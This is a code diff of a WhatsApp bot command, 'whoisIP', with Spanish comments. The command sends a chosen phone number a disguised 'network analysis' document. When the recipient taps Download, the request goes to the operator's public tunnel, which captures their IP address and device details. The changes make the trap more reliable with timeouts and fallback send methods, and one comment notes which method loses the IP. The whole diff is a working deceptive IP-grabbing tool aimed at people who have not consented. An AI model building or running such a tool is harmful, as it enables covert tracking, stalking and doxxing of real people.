@@ -19,6 +19,12 @@ import {
 const PLACEHOLDER = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";
 const FALLBACKS = ["assets/img/whoisip.jpg", "assets/img/default.jpg", "assets/img/bot.jpg"];
 
+const withTimeout = <T>(p: Promise<T>, ms: number, label: string): Promise<T> =>
+  Promise.race([
+    p,
+    new Promise<T>((_, rej) => setTimeout(() => rej(new Error(`timeout: ${label}`)), ms)),
+  ]);
+
 const flagOf = (cc?: string) => (cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️");
 
 function deviceOf(ua: string) {
@@ -89,40 +95,22 @@ export default {
     const { reply, react, msg, args, sock, from, groupMeta } = ctx;
     const log = (t: string) => console.log(`[whoisIP] ${t}`);
 
-    let diag: any = null;
     try {
-      // PASO 0: prueba de vida inmediata
-      await react("🧪").catch(() => undefined);
-      diag = await sock.sendMessage(from, { text: "🧪 *whoisIP v4* cargado, arrancando…" }).catch(() => null);
-      log("v4 arrancado");
+      const modo = (args[0] ?? "").toLowerCase().replace(/[^a-z]/g, "");
 
-      const sub = (args[0] ?? "").toLowerCase().replace(/\D/g, "");
-      const modo = /^ping$/.test((args[0] ?? "").toLowerCase())
-        ? "ping"
-        : /^test$/.test((args[0] ?? "").toLowerCase())
-          ? "test"
-          : "run";
-
-      if (modo === "ping") {
-        return reply("🟢 vivo. El archivo correcto está cargado y ejecutándose.");
-      }
+      if (modo === "ping") return reply("🟢 vivo.");
 
       if (modo === "test") {
         const base = await ensurePublicBase();
-        const prueba = await fetch(`${base}/__ping`, { signal: AbortSignal.timeout(10000) })
-          .then(async (r) => `${r.status} · ${(await r.text()).slice(0, 40)}`)
-          .catch((e) => `error: ${e?.message}`);
-        return reply(`🧪 Túnel: ${base}\nProbe: ${prueba}`);
+        const r = await withTimeout(fetch(`${base}/__ping`), 10000, "probe").catch((e) => ({ status: 0, text: () => e.message } as any));
+        return reply(`🧪 Túnel: ${base}\nProbe: ${r.status} · ${(await r.text()).slice(0, 40)}`);
       }
 
-      // PASO 1: resolver objetivo
       const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
       let raw = "";
       if (contextInfo?.mentionedJid?.length) raw = contextInfo.mentionedJid[0];
       else if (contextInfo?.participant) raw = contextInfo.participant;
       else if (args.length) raw = args.join("");
-      log(`raw=${raw}`);
-
       if (!raw) return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
       if (hasActiveSession(from)) return reply("⏳ Ya hay un *whoisIP* activo en este chat.");
 
@@ -142,69 +130,39 @@ export default {
         targetJid = `${realPhone}@s.whatsapp.net`;
       }
       if (!digits || digits.length < 7) return reply("⚠️ No pude resolver un número. Escríbelo: *whoisIP +573118353868*.");
-      log(`target=${digits} jid=${targetJid}`);
 
-      // PASO 2: existe en WhatsApp
+      await react("🔎").catch(() => undefined);
+
       if (!isLid) {
-        const check = await sock.onWhatsApp(targetJid).catch((e: any) => {
-          log(`onWhatsApp error: ${e?.message}`);
+        const check = await withTimeout(sock.onWhatsApp(targetJid), 10000, "onWhatsApp").catch((e: any) => {
+          log(`onWhatsApp ${e?.message}`);
           return null;
         });
-        log(`onWhatsApp=${JSON.stringify(check)}`);
         if (!check?.[0]?.exists) return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
       }
 
-      // PASO 3: imagen
-      const pushName = participant?.name || participant?.notify || (contextInfo?.participant === targetJid ? msg.pushName : null) || `+${digits}`;
+      const pushName = participant?.name || participant?.notify || `+${digits}`;
+
       let plain: Buffer | null = null;
       try {
-        const pp = await sock.profilePictureUrl(targetJid, "image");
-        log(`pp=${pp ? "si" : "no"}`);
+        const pp = await withTimeout(sock.profilePictureUrl(targetJid, "image"), 9000, "pp");
         if (pp) {
-          const r = await fetch(pp, { signal: AbortSignal.timeout(9000) });
+          const r = await withTimeout(fetch(pp), 9000, "pp-fetch");
           if (r.ok) plain = Buffer.from(await r.arrayBuffer());
         }
       } catch (e: any) {
-        log(`pp error: ${e?.message}`);
+        log(`pp ${e?.message}`);
       }
       if (!plain) {
         const local = FALLBACKS.find((p) => existsSync(p));
         if (local) {
           try {
             plain = await readFile(local);
-            log(`fallback ${local}`);
           } catch {}
         }
       }
-      if (!plain) {
-        try {
-          const r = await fetch(
-            `https://ui-avatars.com/api/?name=${encodeURIComponent(pushName)}&size=640&format=jpg&background=0f172a&color=ffffff`,
-            { signal: AbortSignal.timeout(9000) }
-          );
-          if (r.ok) plain = Buffer.from(await r.arrayBuffer());
-        } catch {}
-      }
       if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");
-      log(`imagen ${plain.length}b`);
 
-      // PASO 4: túnel
-      const base = await ensurePublicBase().catch((e: any) => {
-        log(`tunel error: ${e?.message}`);
-        return null;
-      });
-      if (!base) {
-        await react("❌").catch(() => undefined);
-        return reply(
-          `❌ *Sin túnel público*\n\n` +
-          `El hosting no dejó abrir localtunnel ni tunnelmole.\n\n` +
-          `En la consola: \`npm i localtunnel tunnelmole\` y reinicia.\n` +
-          `O define \`TRAP_BASE_URL\` con un dominio propio.`
-        );
-      }
-      log(`base=${base}`);
-
-      // PASO 5: sesión + autotest
       const session = await createSession({
         plain,
         fileName: `foto_${digits.slice(-4)}.jpg`,
@@ -215,41 +173,79 @@ export default {
         onHit: (s, hit) => sendReport(sock, s, hit),
         onExpire: async (s) => {
           await sock
-            .sendMessage(s.chatJid, {
-              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
-            })
+            .sendMessage(s.chatJid, { text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(TRAP_TTL_MS / 1000)}s.` })
             .catch(() => undefined);
         },
       });
 
       const test = await selfTest(session);
-      log(`selftest=${JSON.stringify(test)}`);
       if (!test.ok) {
         closeSession(session);
         await react("❌").catch(() => undefined);
         return reply(`❌ El túnel no sirve el archivo: *${test.reason}*\n${sessionUrl(session)}`);
       }
 
-      // PASO 6: envío
+      const caption = `🔎 *${fytBold("Análisis de red")}*\n\nToca *Descargar* para generar el reporte.\n\`+${digits}\``;
+
+      // Miniatura: sólo si la imagen es lo bastante pequeña para el stanza
+      const docMsg: any = buildDocumentMessage(session, caption);
+      if (plain.length <= 60000) docMsg.documentMessage.jpegThumbnail = plain;
+
       const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();
-      const docMsg = buildDocumentMessage(
-        session,
-        `🔎 *${fytBold("Análisis de red")}*\n\nToca *Descargar* para generar el reporte.\n\`+${digits}\``,
-        { stanzaId: msg.key.id, participant: msg.key.participant ?? msg.key.remoteJid ?? undefined, remoteJid: from }
+      let enviado = false;
+
+      // Vía A: sendMessage con el proto ya armado (no sube a Meta porque no hay clave "document")
+      if (modo !== "raw") {
+        try {
+          await withTimeout(
+            sock.sendMessage(from, docMsg as any, { messageId, quoted: msg as any } as any),
+            15000,
+            "sendMessage-proto"
+          );
+          enviado = true;
+          log("enviado vía sendMessage(proto)");
+        } catch (e: any) {
+          log(`sendMessage(proto) falló: ${e?.message}`);
+        }
+      }
+
+      // Vía B: relayMessage crudo
+      if (!enviado) {
+        try {
+          await withTimeout(
+            (sock as any).relayMessage(from, docMsg, { messageId }),
+            15000,
+            "relayMessage"
+          );
+          enviado = true;
+          log("enviado vía relayMessage");
+        } catch (e: any) {
+          log(`relayMessage falló: ${e?.message}`);
+        }
+      }
+
+      // Vía C: subida clásica a WhatsApp (pierde la IP, pero confirma que el media sale)
+      if (!enviado) {
+        try {
+          await sock.sendMessage(from, {
+            document: { url: sessionUrl(session) },
+            mimetype: "image/jpeg",
+            fileName: session.fileName,
+            caption,
+          } as any);
+          enviado = true;
+          log("enviado vía upload (sin captura de IP)");
+        } catch (e: any) {
+          log(`upload falló: ${e?.message}`);
+        }
+      }
+
+      await react(enviado ? "📡" : "❌").catch(() => undefined);
+      return reply(
+        enviado
+          ? `✅ Documento enviado\n${sessionUrl(session)}`
+          : `❌ No salió por ninguna vía. Revisa la consola.`
       );
-
-      log(`relayMessage=${typeof (sock as any).relayMessage}`);
-      if (typeof (sock as any).relayMessage !== "function") {
-        return reply("❌ `sock.relayMessage` no existe en esta versión de Baileys.");
-      }
-
-      await (sock as any).relayMessage(from, docMsg, { messageId });
-      log("relay OK");
-
-      await react("📡").catch(() => undefined);
-      if (diag?.key?.id) {
-        await sock.sendMessage(from, { text: "✅ documento enviado (si no lo ves, el servidor lo descartó)" }, { quoted: diag }).catch(() => undefined);
-      }
     } catch (e: any) {
       log(`ERROR ${e?.stack ?? e}`);
       await react("❌").catch(() => undefined);
